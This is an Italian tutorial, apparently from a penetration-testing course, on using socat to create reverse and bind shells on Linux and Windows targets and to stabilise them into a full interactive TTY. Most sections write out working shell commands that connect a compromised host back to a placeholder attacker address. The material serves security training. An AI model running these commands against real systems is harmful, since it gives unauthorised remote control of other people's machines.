Socat è simile a netcat per certi versi, ma fondamentalmente diverso per molti altri. Il modo più semplice per pensare a socat **è** come a un **connettore tra due punti**. 

Ancora una volta, cominciamo con le shell inverse.

# Reverse Shell

Come accennato in precedenza, la **sintassi** per **socat** diventa molto più **difficile** di quella di netcat. Ecco la sintassi per un listener di reverse shell di base in socat:

- **`socat TCP-L:<port> -`**

Come sempre con socat, questo **richiede due punti** (**una porta di ascolto e un input standard**) e collegandoli insieme. La shell risultante è instabile, ma funzionerà sia su Linux che su Windows ed è equivalente a **`nc -lvnp <port>`**.

Su Windows useremmo questo comando per riconnetterci:

- **`socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes`**

L'opzione "pipes" viene utilizzata per forzare PowerShell (o cmd.exe) a utilizzare input e output standard in stile Unix.

Questo è il comando equivalente per un Target Linux :

- **`socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"`**

# Bind Shell

Su un target Linux useremmo il seguente comando:

- **`socat TCP-L:<PORT> EXEC:"bash -li"`**

Su un target Windows useremmo questo comando per il nostro listener:

- **`socat TCP-L:<PORT> EXEC:powershell.exe,pipes`**

Utilizziamo l'argomento "pipes" per creare un'interfaccia tra i metodi Unix e Windows di gestione dell'input e dell'output in un ambiente CLI .

**Indipendentemente dal bersaglio**, utilizziamo questo comando sulla macchina attaccante per **connetterci all'ascoltatore in attesa**.

- **`socat TCP:<TARGET-IP>:<TARGET-PORT> -`**

---

# Usi potenti di Socat:

Una shell reverse tty Linux completamente stabile . Funzionerà solo quando il target è Linux , ma è *significativamente* più stabile. Come accennato in precedenza, socat è uno strumento incredibilmente versatile; tuttavia, la seguente tecnica è forse una delle sue applicazioni più utili. Ecco **la nuova sintassi dell'ascoltatore:**

- **`socat TCP-L:<port> FILE:`tty`,raw,echo=0`**

Scomponiamo questo comando in due parti. Come al solito, stiamo collegando due punti insieme. **In questo caso, quei punti sono una porta di ascolto e un file**. Nello specifico, stiamo passando il **TTY** corrente come un **file** e i**mpostando l'echo a zero**. Ciò equivale approssimativamente a usare il **`stty raw -echo; fg`**trucco Ctrl + Z con una shell netcat, con il vantaggio aggiuntivo di essere immediatamente stabile e agganciarsi a un tty completo.

Il primo listener può essere connesso con qualsiasi payload; Alcuni  **payload per funzionare devo interagire con la macchina target avente installato socat. Ciò significa che il target deve avere socat installato.** La maggior parte delle macchine non ha socat installato di default, tuttavia, è possibile caricare un [binario socat precompilato](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true) , che può quindi essere eseguito normalmente.

**Il comando speciale è il seguente:**

- **`socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane`**

Si tratta di un argomento piuttosto vasto, quindi analizziamolo nel dettaglio.

La prima parte è semplice: ci colleghiamo con l'ascoltatore in esecuzione sulla nostra macchina. La seconda parte del comando crea una sessione bash interattiva con  **`EXEC:"bash -li"`**. Stiamo anche passando gli argomenti: pty, stderr, sigint, setsid e sane:

- **pty**, alloca uno pseudo terminale sul target -- parte del processo di stabilizzazione
- **stderr**, assicura che tutti i messaggi di errore vengano visualizzati nella shell (spesso un problema con le shell non interattive)
- **sigint**, passa tutti i comandi Ctrl + C nel sottoprocesso, consentendoci di terminare i comandi all'interno della shell
- **setsid**, crea il processo in una nuova sessione
- **sane**, stabilizza il terminale, tentando di "normalizzarlo".

C'è molto da assimilare, quindi vediamolo in azione.

Come al solito, sulla **sinistra** abbiamo un **listener** in esecuzione sulla nostra **macchina** di attacco **locale**, sulla **destra** abbiamo una simulazione di un **obiettivo** compromesso, in esecuzione con una **shell non interattiva**. Utilizzando la shell netcat non interattiva, **eseguiamo il comando speciale socat e riceviamo una shell bash completamente interattiva sul listener socat a sinistra:**

![image](https://github.com/user-attachments/assets/1873994e-57b3-4f91-80dc-ffda2ccd661f)

Nota che la shell socat è completamente interattiva, consentendoci di usare comandi interattivi come SSH . Questo può essere ulteriormente migliorato impostando i valori stty come visto nel task precedente, che ci permetterà di usare editor di testo come Vim o Nano.

---

Se, in qualsiasi momento, una shell socat non funziona correttamente, vale la pena di aumentarne la verbosità aggiungendo **`-d -d`**nel comando. Questo è molto utile per scopi sperimentali, ma di solito non è necessario per un uso generale.
